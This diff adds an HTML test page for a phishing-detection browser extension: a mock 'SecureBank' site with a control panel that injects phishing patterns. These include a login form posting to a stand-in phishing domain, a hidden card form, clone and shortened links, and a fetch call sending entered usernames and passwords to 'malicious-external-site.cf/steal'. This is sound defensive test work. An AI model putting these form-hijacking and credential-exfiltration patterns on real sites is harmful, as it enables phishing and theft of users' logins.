@@ -1,0 +1,857 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecureBank - Online Banking</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        /* Banking Website (Left Side) */
+        .banking-site {
+            flex: 1;
+            background: white;
+            overflow-y: auto;
+            position: relative;
+        }
+        
+        .bank-header {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .bank-logo {
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        .bank-nav {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .bank-nav a {
+            color: white;
+            text-decoration: none;
+            opacity: 0.9;
+            transition: opacity 0.3s;
+        }
+        
+        .bank-nav a:hover {
+            opacity: 1;
+        }
+        
+        .bank-content {
+            padding: 40px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .welcome-section {
+            margin-bottom: 40px;
+        }
+        
+        .welcome-section h1 {
+            color: #1e3c72;
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+        
+        .account-summary {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+        
+        .account-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        
+        .account-card h3 {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-bottom: 10px;
+        }
+        
+        .account-balance {
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .account-number {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+        
+        .actions-section {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            margin-bottom: 30px;
+        }
+        
+        .actions-section h2 {
+            color: #1e3c72;
+            margin-bottom: 20px;
+        }
+        
+        .action-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+        }
+        
+        .action-btn {
+            background: #2a5298;
+            color: white;
+            border: none;
+            padding: 15px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 500;
+            transition: background 0.3s;
+        }
+        
+        .action-btn:hover {
+            background: #1e3c72;
+        }
+        
+        .login-form-container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        
+        .login-form-container h2 {
+            color: #1e3c72;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #2a5298;
+        }
+        
+        .login-btn {
+            width: 100%;
+            background: #2a5298;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .login-btn:hover {
+            background: #1e3c72;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        /* Control Panel (Right Side) */
+        .control-panel {
+            width: 400px;
+            background: #1a1a1a;
+            color: white;
+            padding: 20px;
+            overflow-y: auto;
+            border-left: 2px solid #333;
+        }
+        
+        .control-panel h2 {
+            color: #fff;
+            margin-bottom: 20px;
+            font-size: 20px;
+            border-bottom: 2px solid #333;
+            padding-bottom: 10px;
+        }
+        
+        .control-section {
+            margin-bottom: 30px;
+            padding: 15px;
+            background: #252525;
+            border-radius: 8px;
+        }
+        
+        .control-section h3 {
+            color: #fff;
+            font-size: 14px;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .toggle-switch {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: #2a2a2a;
+            border-radius: 6px;
+        }
+        
+        .toggle-switch label {
+            flex: 1;
+            font-size: 13px;
+            color: #ccc;
+        }
+        
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+        }
+        
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #444;
+            transition: .4s;
+            border-radius: 24px;
+        }
+        
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        
+        input:checked + .slider {
+            background-color: #dc3545;
+        }
+        
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+        
+        .stats-display {
+            background: #0d1117;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+        }
+        
+        .stat-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .stat-label {
+            color: #8b949e;
+        }
+        
+        .stat-value {
+            color: #fff;
+            font-weight: bold;
+        }
+        
+        .stat-value.critical {
+            color: #f85149;
+        }
+        
+        .stat-value.warning {
+            color: #d29922;
+        }
+        
+        .stat-value.secure {
+            color: #3fb950;
+        }
+        
+        .threat-indicator {
+            background: #161b22;
+            padding: 10px;
+            border-radius: 6px;
+            margin-top: 10px;
+            font-size: 12px;
+            border-left: 3px solid #f85149;
+        }
+        
+        .threat-indicator.warning {
+            border-left-color: #d29922;
+        }
+        
+        .threat-indicator.secure {
+            border-left-color: #3fb950;
+        }
+        
+        .info-text {
+            font-size: 11px;
+            color: #8b949e;
+            margin-top: 10px;
+            line-height: 1.5;
+        }
+        
+        .external-link {
+            color: #58a6ff;
+            text-decoration: none;
+        }
+        
+        .external-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <!-- Banking Website (Left Side) -->
+    <div class="banking-site">
+        <div class="bank-header">
+            <div class="bank-logo">🏦 SecureBank</div>
+            <nav class="bank-nav" id="bankNav">
+                <a href="#home">Home</a>
+                <a href="#accounts">Accounts</a>
+                <a href="#transfers">Transfers</a>
+                <a href="#payments">Payments</a>
+                <a href="#settings">Settings</a>
+            </nav>
+        </div>
+        
+        <div class="bank-content">
+            <div class="welcome-section">
+                <h1>Welcome back, John Doe</h1>
+                <p style="color: #666; margin-top: 5px;">Manage your accounts securely</p>
+            </div>
+            
+            <div class="account-summary">
+                <div class="account-card">
+                    <h3>Checking Account</h3>
+                    <div class="account-balance">$12,450.00</div>
+                    <div class="account-number">****1234</div>
+                </div>
+                <div class="account-card">
+                    <h3>Savings Account</h3>
+                    <div class="account-balance">$45,230.00</div>
+                    <div class="account-number">****5678</div>
+                </div>
+            </div>
+            
+            <div class="actions-section">
+                <h2>Quick Actions</h2>
+                <div class="action-buttons">
+                    <button class="action-btn">Transfer Money</button>
+                    <button class="action-btn">Pay Bills</button>
+                    <button class="action-btn">View Statements</button>
+                    <button class="action-btn">Account Settings</button>
+                </div>
+            </div>
+            
+            <!-- Login Form (initially hidden, can be added via control panel) -->
+            <div id="loginFormContainer" class="hidden">
+                <div class="login-form-container">
+                    <h2>Sign In to Your Account</h2>
+                    <form id="loginForm" method="post">
+                        <div class="form-group">
+                            <label for="username">Username</label>
+                            <input type="text" id="username" name="username" placeholder="Enter your username" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="password">Password</label>
+                            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                        </div>
+                        <button type="submit" class="login-btn">Sign In</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Control Panel (Right Side) -->
+    <div class="control-panel">
+        <h2>🛡️ Phishing Control Panel</h2>
+        
+        <!-- Real-time Stats -->
+        <div class="stats-display">
+            <div class="stat-item">
+                <span class="stat-label">Anomaly Score:</span>
+                <span class="stat-value" id="anomalyScore">0</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-label">Confidence:</span>
+                <span class="stat-value" id="confidenceScore">0%</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-label">Severity:</span>
+                <span class="stat-value secure" id="severity">SECURE</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-label">Threats Detected:</span>
+                <span class="stat-value" id="threatCount">0</span>
+            </div>
+        </div>
+        
+        <!-- Threat Indicators -->
+        <div id="threatIndicators"></div>
+        
+        <!-- Form Manipulation -->
+        <div class="control-section">
+            <h3>🔐 Form Manipulation</h3>
+            
+            <div class="toggle-switch">
+                <label>Add Phishing Login Form</label>
+                <label class="switch">
+                    <input type="checkbox" id="togglePhishingForm" onchange="togglePhishingForm()">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            
+            <div class="toggle-switch">
+                <label>Change Form Action (External)</label>
+                <label class="switch">
+                    <input type="checkbox" id="toggleExternalAction" onchange="toggleExternalAction()">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            
+            <div class="toggle-switch">
+                <label>Add Hidden Payment Form</label>
+                <label class="switch">
+                    <input type="checkbox" id="toggleHiddenForm" onchange="toggleHiddenForm()">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            
+            <div class="info-text">
+                Toggle these switches to add phishing patterns. Watch the anomaly score increase in real-time.
+            </div>
+        </div>
+        
+        <!-- Link Manipulation -->
+        <div class="control-section">
+            <h3>🔗 Link Manipulation</h3>
+            
+            <div class="toggle-switch">
+                <label>Add Clone Pattern Links</label>
+                <label class="switch">
+                    <input type="checkbox" id="toggleCloneLinks" onchange="toggleCloneLinks()">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            
+            <div class="toggle-switch">
+                <label>Add URL Shorteners</label>
+                <label class="switch">
+                    <input type="checkbox" id="toggleShorteners" onchange="toggleShorteners()">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            
+            <div class="toggle-switch">
+                <label>Add Suspicious TLDs</label>
+                <label class="switch">
+                    <input type="checkbox" id="toggleSuspiciousTLD" onchange="toggleSuspiciousTLD()">
+                    <span class="slider"></span>
+                </label>
+            </div>
+        </div>
+        
+        <!-- Data Exfiltration -->
+        <div class="control-section">
+            <h3>📤 Data Exfiltration</h3>
+            
+            <div class="toggle-switch">
+                <label>Enable Sensitive Data POST</label>
+                <label class="switch">
+                    <input type="checkbox" id="toggleSensitivePOST" onchange="toggleSensitivePOST()">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            
+            <div class="info-text">
+                When enabled, form submissions will POST sensitive data to external domains.
+            </div>
+        </div>
+        
+        <!-- Reset Button -->
+        <div class="control-section">
+            <button onclick="resetAll()" style="width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600;">
+                🔄 Reset All Threats
+            </button>
+        </div>
+        
+        <!-- Instructions -->
+        <div class="control-section">
+            <h3>📋 Instructions</h3>
+            <div class="info-text">
+                <strong>How to test:</strong><br>
+                1. Start with all switches OFF (secure state)<br>
+                2. Toggle switches ON to add threats<br>
+                3. Watch anomaly score increase<br>
+                4. Check extension popup for details<br>
+                5. Open DevTools Console (F12) for logs
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // State tracking
+        const state = {
+            phishingForm: false,
+            externalAction: false,
+            hiddenForm: false,
+            cloneLinks: false,
+            shorteners: false,
+            suspiciousTLD: false,
+            sensitivePOST: false
+        };
+        
+        let updateInterval = null;
+        const hostname = window.location.hostname;
+        
+        // Read stats from extension via content script bridge
+        function updateStatsFromExtension() {
+            // Check if bridge has exposed data
+            if (window.extensionHeuristicsData) {
+                const data = window.extensionHeuristicsData;
+                
+                // Update display with extension's analysis
+                const score = data.anomalyScore || 0;
+                const confidence = data.confidenceScore || 0;
+                const severity = data.severity || 'secure';
+                const issues = data.detectedIssues || [];
+                
+                document.getElementById('anomalyScore').textContent = score;
+                document.getElementById('confidenceScore').textContent = confidence + '%';
+                document.getElementById('severity').textContent = severity.toUpperCase();
+                document.getElementById('severity').className = 'stat-value ' + severity;
+                document.getElementById('threatCount').textContent = issues.length;
+                
+                // Update threat indicators from extension's detected issues
+                updateThreatIndicatorsFromExtension(issues);
+            } else {
+                // No data yet - show loading state
+                document.getElementById('anomalyScore').textContent = '0';
+                document.getElementById('confidenceScore').textContent = '0%';
+                document.getElementById('severity').textContent = 'SECURE';
+                document.getElementById('severity').className = 'stat-value secure';
+                document.getElementById('threatCount').textContent = '0';
+                document.getElementById('threatIndicators').innerHTML = 
+                    '<div class="threat-indicator secure">⏳ Waiting for extension analysis...</div>';
+            }
+        }
+        
+        function updateThreatIndicatorsFromExtension(issues) {
+            const container = document.getElementById('threatIndicators');
+            container.innerHTML = '';
+            
+            if (issues.length === 0) {
+                container.innerHTML = '<div class="threat-indicator secure">✅ No threats detected</div>';
+                return;
+            }
+            
+            issues.forEach(issue => {
+                const severity = issue.severity || 'warning';
+                const message = issue.message || issue.type || 'Unknown threat';
+                const confidence = issue.confidence || 0;
+                
+                const indicator = document.createElement('div');
+                indicator.className = `threat-indicator ${severity}`;
+                indicator.textContent = `${severity === 'critical' ? '🚨' : '⚠️'} ${message} (${confidence}% confidence)`;
+                container.appendChild(indicator);
+            });
+        }
+        
+        // Trigger heuristics re-analysis
+        function triggerHeuristicsReanalysis() {
+            // The heuristics engine should detect changes via MutationObserver
+            // But we can also manually trigger a re-analysis by dispatching a custom event
+            // or by waiting for the MutationObserver to catch the changes
+            
+            // Force a small delay to let DOM settle, then trigger analysis
+            setTimeout(() => {
+                // Dispatch a custom event that the heuristics engine can listen to
+                window.dispatchEvent(new CustomEvent('heuristics-trigger'));
+                
+                // Also try to manually call the heuristics engine if available
+                if (typeof window.initHeuristics === 'function') {
+                    window.initHeuristics();
+                }
+            }, 100);
+        }
+        
+        // Toggle functions - now trigger re-analysis
+        function togglePhishingForm() {
+            state.phishingForm = document.getElementById('togglePhishingForm').checked;
+            const container = document.getElementById('loginFormContainer');
+            
+            if (state.phishingForm) {
+                container.classList.remove('hidden');
+                console.log('🔴 Phishing login form added');
+            } else {
+                container.classList.add('hidden');
+                console.log('✅ Phishing login form removed');
+            }
+            
+            triggerHeuristicsReanalysis();
+        }
+        
+        function toggleExternalAction() {
+            state.externalAction = document.getElementById('toggleExternalAction').checked;
+            const form = document.getElementById('loginForm');
+            
+            if (state.externalAction && form) {
+                form.action = 'https://phishing-site.tk/login';
+                console.log('🔴 Form action changed to external domain: phishing-site.tk');
+            } else if (form) {
+                form.action = '';
+                console.log('✅ Form action reset');
+            }
+            
+            triggerHeuristicsReanalysis();
+        }
+        
+        function toggleHiddenForm() {
+            state.hiddenForm = document.getElementById('toggleHiddenForm').checked;
+            
+            if (state.hiddenForm) {
+                // Create hidden payment form
+                const hiddenForm = document.createElement('form');
+                hiddenForm.id = 'hiddenPaymentForm';
+                hiddenForm.className = 'hidden';
+                hiddenForm.action = 'https://malicious-site.ml/steal';
+                hiddenForm.method = 'post';
+                hiddenForm.innerHTML = `
+                    <input type="text" name="card_number" value="4111-1111-1111-1111">
+                    <input type="text" name="cvv" value="123">
+                    <input type="text" name="expiration" value="12/25">
+                `;
+                document.body.appendChild(hiddenForm);
+                console.log('🔴 Hidden payment form added');
+            } else {
+                const form = document.getElementById('hiddenPaymentForm');
+                if (form) form.remove();
+                console.log('✅ Hidden payment form removed');
+            }
+            
+            triggerHeuristicsReanalysis();
+        }
+        
+        function toggleCloneLinks() {
+            state.cloneLinks = document.getElementById('toggleCloneLinks').checked;
+            const nav = document.getElementById('bankNav');
+            
+            if (state.cloneLinks) {
+                // Replace navigation links with clone pattern
+                nav.innerHTML = `
+                    <a href="https://fake-bank-clone.ga/home">Home</a>
+                    <a href="https://fake-bank-clone.ga/accounts">Accounts</a>
+                    <a href="https://fake-bank-clone.ga/transfers">Transfers</a>
+                    <a href="https://fake-bank-clone.ga/payments">Payments</a>
+                    <a href="https://fake-bank-clone.ga/settings">Settings</a>
+                `;
+                console.log('🔴 Clone pattern links added');
+            } else {
+                nav.innerHTML = `
+                    <a href="#home">Home</a>
+                    <a href="#accounts">Accounts</a>
+                    <a href="#transfers">Transfers</a>
+                    <a href="#payments">Payments</a>
+                    <a href="#settings">Settings</a>
+                `;
+                console.log('✅ Navigation links reset');
+            }
+            
+            triggerHeuristicsReanalysis();
+        }
+        
+        function toggleShorteners() {
+            state.shorteners = document.getElementById('toggleShorteners').checked;
+            const actionButtons = document.querySelector('.action-buttons');
+            
+            if (state.shorteners && actionButtons) {
+                actionButtons.innerHTML = `
+                    <a href="https://bit.ly/fake-transfer" class="action-btn">Transfer Money</a>
+                    <a href="https://tinyurl.com/fake-pay" class="action-btn">Pay Bills</a>
+                    <a href="https://t.co/fake-statements" class="action-btn">View Statements</a>
+                    <a href="https://goo.gl/fake-settings" class="action-btn">Account Settings</a>
+                `;
+                console.log('⚠️ URL shortener links added');
+            } else if (actionButtons) {
+                actionButtons.innerHTML = `
+                    <button class="action-btn">Transfer Money</button>
+                    <button class="action-btn">Pay Bills</button>
+                    <button class="action-btn">View Statements</button>
+                    <button class="action-btn">Account Settings</button>
+                `;
+                console.log('✅ Action buttons reset');
+            }
+            
+            triggerHeuristicsReanalysis();
+        }
+        
+        function toggleSuspiciousTLD() {
+            state.suspiciousTLD = document.getElementById('toggleSuspiciousTLD').checked;
+            const welcomeSection = document.querySelector('.welcome-section');
+            
+            if (state.suspiciousTLD && welcomeSection) {
+                const link = document.createElement('a');
+                link.href = 'https://suspicious-site.tk/verify';
+                link.className = 'external-link';
+                link.textContent = 'Verify your account';
+                link.style.display = 'block';
+                link.style.marginTop = '10px';
+                link.id = 'suspiciousLink';
+                welcomeSection.appendChild(link);
+                console.log('⚠️ Suspicious TLD link added');
+            } else {
+                const link = document.getElementById('suspiciousLink');
+                if (link) link.remove();
+                console.log('✅ Suspicious link removed');
+            }
+            
+            triggerHeuristicsReanalysis();
+        }
+        
+        function toggleSensitivePOST() {
+            state.sensitivePOST = document.getElementById('toggleSensitivePOST').checked;
+            const form = document.getElementById('loginForm');
+            
+            if (state.sensitivePOST && form) {
+                form.addEventListener('submit', interceptSensitivePOST);
+                console.log('🔴 Sensitive data POST interception enabled');
+            } else if (form) {
+                form.removeEventListener('submit', interceptSensitivePOST);
+                console.log('✅ Sensitive data POST disabled');
+            }
+            
+            triggerHeuristicsReanalysis();
+        }
+        
+        function interceptSensitivePOST(e) {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            
+            // This will be intercepted by the heuristics engine
+            fetch('https://malicious-external-site.cf/steal', {
+                method: 'POST',
+                body: JSON.stringify({
+                    username: formData.get('username'),
+                    password: formData.get('password'),
+                    ssn: '123-45-6789',
+                    credit_card: '4111-1111-1111-1111'
+                }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            }).catch(err => {
+                console.log('POST intercepted:', err);
+            });
+            
+            alert('⚠️ Sensitive data POST attempted! Check extension popup.');
+        }
+        
+        function resetAll() {
+            // Reset all toggles
+            document.getElementById('togglePhishingForm').checked = false;
+            document.getElementById('toggleExternalAction').checked = false;
+            document.getElementById('toggleHiddenForm').checked = false;
+            document.getElementById('toggleCloneLinks').checked = false;
+            document.getElementById('toggleShorteners').checked = false;
+            document.getElementById('toggleSuspiciousTLD').checked = false;
+            document.getElementById('toggleSensitivePOST').checked = false;
+            
+            // Reset state
+            Object.keys(state).forEach(key => state[key] = false);
+            
+            // Reset UI
+            togglePhishingForm();
+            toggleExternalAction();
+            toggleHiddenForm();
+            toggleCloneLinks();
+            toggleShorteners();
+            toggleSuspiciousTLD();
+            toggleSensitivePOST();
+            
+            console.log('🔄 All threats reset - site is now secure');
+        }
+        
+        // Initialize - start polling extension data
+        updateStatsFromExtension();
+        
+        // Poll for updates every 500ms
+        updateInterval = setInterval(updateStatsFromExtension, 500);
+        
+        // Listen for custom event from content script bridge
+        window.addEventListener('extension-heuristics-update', (event) => {
+            updateStatsFromExtension();
+        });
+        
+        console.log('🏦 Banking website loaded');
+        console.log('🛡️ Use the control panel to add phishing patterns');
+        console.log('📊 Control panel reads from extension analysis in real-time');
+        console.log('⚠️ Make sure the extension is installed and active!');
+    </script>
+</body>
+</html>
